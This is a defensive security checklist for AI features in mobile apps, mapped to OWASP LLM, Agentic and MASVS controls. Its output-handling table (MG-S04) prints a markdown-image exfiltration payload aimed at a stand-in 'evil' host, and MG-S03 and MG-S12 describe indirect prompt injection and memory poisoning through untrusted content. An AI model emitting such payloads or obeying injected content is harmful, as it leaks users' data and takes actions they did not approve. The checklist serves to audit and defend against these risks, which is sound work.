# AI security checks (MG-S)

These checks cover risks that AI features add to a mobile app, mapped to the standards security teams audit against:

- **OWASP Top 10 for LLM Applications 2025** (LLM01–LLM10)
- **OWASP Top 10 for Agentic Applications 2026** (ASI01–ASI10)
- **OWASP MASVS v2** controls (MASVS-*)

Most mobile teams apply none of these to their AI code. The mobile twist on every check is the same: **the client is in the attacker's hands.** Anything in the binary or bundle is public, and anything the model outputs is attacker-influenced once any untrusted text reaches its context.

A finding states **impact as attacker capability**: who can do what, from where, at what cost. Examples: "anyone who downloads the app can…", "a web page the user asks about can make the agent…".

---

## MG-S01 · Provider credential ships in the app — LLM10, ASI03, MASVS-STORAGE-1 / MASVS-RESILIENCE

- **Why it is missed:** teams move keys into "env vars" and believe they are safe, but build-time env values are compiled into the bundle. React Native bundles and Hermes bytecode decompile in minutes.
- **Trace:** for each credential column marked *client*, find its origin: a literal, `.env`, `EXPO_PUBLIC_*`, `react-native-config`, `app.config` `extra`, `buildConfigField`, Info.plist or xcconfig, `--dart-define`, or a Flutter `.env` asset.
- **Severity:** a Blocker for any long-lived provider key in a store build. Also check git history (`git log -p -S 'sk-'`), since a key that was ever committed must be rotated.
- **Not a finding:**
  - Server-side code (Expo Router `+api` routes deployed to a server, cloud functions).
  - A BYOK key the user enters at runtime (judge its storage under MG-S07).
  - Firebase AI Logic with **App Check enforced**, which is Google's sanctioned client-side pattern. Verify App Check enforcement is on.
  - Short-lived scoped tokens minted by your server (for example OpenAI Realtime ephemeral keys).
- **Fix:** route calls through your backend with per-user auth; or Firebase AI Logic plus App Check (App Attest / Play Integrity); then rotate the leaked key.

## MG-S02 · Unbounded consumption / denial of wallet — LLM10, ASI08

- **Trace:** the proxy or client sets output token caps; enforces per-user and per-device quotas server-side; attests that requests come from the genuine app (App Attest, Play Integrity, App Check); bounds retries and streaming reconnect loops; and caps agent-loop iterations and tool-call depth.
- **Impact phrasing:** "one script using the extracted key, or your open proxy, can spend $X/day."
- **Fix:** server-side quota keyed to the authenticated user, `max_tokens` on every call, iteration caps on agent loops, and billing alerts.

## MG-S03 · Prompt injection reaches privileged context — LLM01, ASI01, ASI06

- **Mobile-specific indirect sources:** clipboard reads, share-extension input, notification content, OCR or vision on user images, fetched web pages, email or SMS or calendar content read by an agent, documents and PDFs, and RAG over user-imported files.
- **Trace:** which untrusted sources enter the same context as tools, secrets, or other users' data? Concatenating user text into the system prompt is the weak form (Medium). The serious form is untrusted content in context **plus** a privileged sink: tools (MG-S05), WebView or links (MG-S04), or persistent memory (MG-S12).
- **Fix:** keep untrusted content in user-role messages with delimiters; the impact control is gating sinks (S04/S05), not prompt wording.

## MG-S04 · Improper output handling: model output reaches a dangerous sink — LLM05, ASI05, MASVS-PLATFORM-2

Treat model output as untrusted input. Check each output column for these sinks:

| Sink | Exploit |
|---|---|
| WebView HTML with JS enabled | Script runs with the WebView's origin and bridges |
| `eval` / `new Function` / `evaluateScript` | Arbitrary code in the app's JS runtime |
| `Linking.openURL` / `UIApplication.open` / `Intent.parseUri` / `launchUrl` from generated links | `tel:`, `sms:`, `intent:`, and your own deep links fire actions (`myapp://transfer?...`) |
| Markdown renderer auto-loading images | **Exfiltration:** `![](https://evil/?d=<secret>)` leaks context the instant it renders |
| SQL / file paths / navigation params | Injection, path traversal, privileged screens |

- **Fix:** render as text or sanitized markdown; strip images or allow-list their hosts; allow-list URL schemes and hosts before opening links and confirm external opens; parse structured output against a schema; never execute generated code in-process.

## MG-S05 · Excessive agency: tools and ambient agents act without a human gate — LLM06, ASI02, ASI03, ASI09

- **Trace every capability the model can trigger.**
  - **Function and tool calling:** what each tool does. Does a side-effecting tool (send, pay, delete, post, share, call, change settings, read contacts/health/location) show the user the exact parameters and require a tap before it runs? Is dispatch an allow-list, or a reflective `handlers[call.name]`?
  - **WebView bridges:** a `postMessage` or JS-interface handler that performs native actions is a tool, and any page in that WebView can call it.
  - **System agents:** App Intents (Siri, Shortcuts, Apple Intelligence) and Android AppFunctions (Gemini) can run your code with no UI.
    - On iOS, check for `requestConfirmation` on side effects and `authenticationPolicy = .requiresAuthentication` for anything that should not run from a locked device.
    - On Android, check permission checks inside each `@AppFunction`.
- **Fix:** per-action confirmation showing the parameters, an allow-listed dispatcher, least-privilege tools (read-only by default), and scoped short-lived credentials for any tool that calls your backend.

## MG-S06 · Sensitive data sent to the provider beyond need — LLM02, MASVS-PRIVACY-1

- **Trace:** inputs on flow rows that include contacts, health, precise location, photos (with **EXIF GPS**), full documents, auth tokens, or other users' data (group chats). Check minimization and redaction, provider data-retention and training settings (zero data retention or enterprise terms), and region requirements.
- **Fix:** send the minimum; strip EXIF; redact identifiers; document retention terms; feed MG-R01/R02/R03 declarations.

## MG-S07 · AI data at rest unprotected — MASVS-STORAGE-1/2

- **Trace:** where do conversation history, generated media, embeddings, and **BYOK keys** live? Unsafe locations include AsyncStorage, MMKV without an `encryptionKey` (or with a hardcoded one), UserDefaults, SharedPreferences, Hive without encryption, and plain files. Check backups: `android:allowBackup="true"` and iCloud backup of documents. Check whether logout or account switch clears history.
- **Fix:** keys in Keychain/Keystore (`expo-secure-store`, `react-native-keychain`, `EncryptedSharedPreferences`); history encrypted with a Keychain-held key; exclude it from backup; clear it on logout.

## MG-S08 · Prompts and responses leak into logs and telemetry — LLM02, MASVS-STORAGE-2, MASVS-PRIVACY

- **Trace:**
  - `console.log` of prompts or responses in release builds (Hermes keeps them unless stripped).
  - Native `print`/`NSLog`/`Log.d`.
  - Crash-reporter breadcrumbs, context, or attachments carrying message text.
  - Analytics events with prompt text.
  - Network inspectors left in release (Reactotron, Flipper, Chucker).
- **Store tie-in:** each telemetry SDK receiving AI content is an extra third-party recipient. Feed it into MG-R01/R02/R03.
- **Fix:** strip console calls in release (`babel-plugin-transform-remove-console`), log metadata (model, latency, token counts) and never content, and scrub breadcrumbs with `beforeBreadcrumb`/`beforeSend`.

## MG-S09 · Security logic and secrets in the client prompt — LLM07

- **Trace:** system prompts in the bundle that hold access rules ("only premium users may…"), hidden instructions, internal URLs, or credentials. Assume an attacker can read every client prompt.
- **Fix:** enforce entitlement and access server-side; keep prompts free of secrets; move proprietary prompts server-side if they are a business asset.

## MG-S10 · Insecure transport for AI traffic — MASVS-NETWORK-1/2

- **Trace:** `http://` AI endpoints other than loopback or a deliberate local LLM server, `NSAllowsArbitraryLoads`, `usesCleartextTraffic`, a cleartext network-security-config, and TLS-validation overrides (trust-all `X509TrustManager`, permissive `HostnameVerifier`, `URLSession` delegates that accept any server trust, Dart `badCertificateCallback`).
- **Calibrate:** local-network LLM clients (Ollama or LM Studio on LAN) legitimately need cleartext. Scope the exception to those hosts, and tell the user that traffic is unencrypted.

## MG-S11 · Model and update supply chain — LLM03, LLM04, ASI04, MASVS-CODE-4

- **Trace:**
  - On-device model downloads: is the URL pinned to an immutable revision (a Hugging Face commit SHA rather than `main`), with the SHA-256 verified before load and storage protected from tampering?
  - OTA JS updates: `expo-updates` with `codeSigningCertificate` configured, or an unsigned channel?
  - AI SDKs and plugins pulled from unvetted packages.
- **Fix:** pin revisions and verify hashes; sign OTA updates; keep an AI bill of materials (providers, models, versions) in the repo.

## MG-S12 · Persistent memory and RAG poisoning — ASI06, LLM08

- **Trace:** agent memory or vector stores written from untrusted content (web pages, received messages, shared docs) and later read into privileged contexts; memory shared across accounts on one device; embeddings stored unencrypted (MG-S07).
- **Fix:** tag provenance on memory writes, let users view and delete memories, isolate memory per account, and never let retrieved content authorize tools.

## MG-S13 · Users misled about AI involvement — ASI09, LLM09, EU AI Act Art. 50

- **Trace:** is it clear at the point of interaction that the user is talking to AI? EU AI Act Article 50 transparency obligations apply from 2 August 2026 to EU users. Are AI-generated images, voices, or "replies sent as you" labelled? Does the UI present model output as verified fact (medical, financial, legal; see MG-R11)?
- **Fix:** label AI participation where the output appears, mark generated media, show citations or uncertainty, and require user review before AI-written content is sent in the user's name.
